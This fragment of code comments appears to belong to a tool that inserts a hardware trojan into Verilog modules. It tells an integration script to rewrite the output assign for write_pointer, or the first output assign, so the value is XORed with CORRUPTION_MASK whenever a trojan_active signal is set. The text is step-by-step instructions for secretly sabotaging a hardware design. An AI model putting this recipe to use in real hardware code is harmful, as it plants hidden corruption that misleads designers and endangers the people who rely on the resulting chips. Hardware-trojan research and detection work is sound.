...
//
// IMPORTANT: write_pointer may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If write_pointer is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for write_pointer (or first output assign):
//     assign write_pointer = <expr>;
//   Replace with:
//     assign write_pointer = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
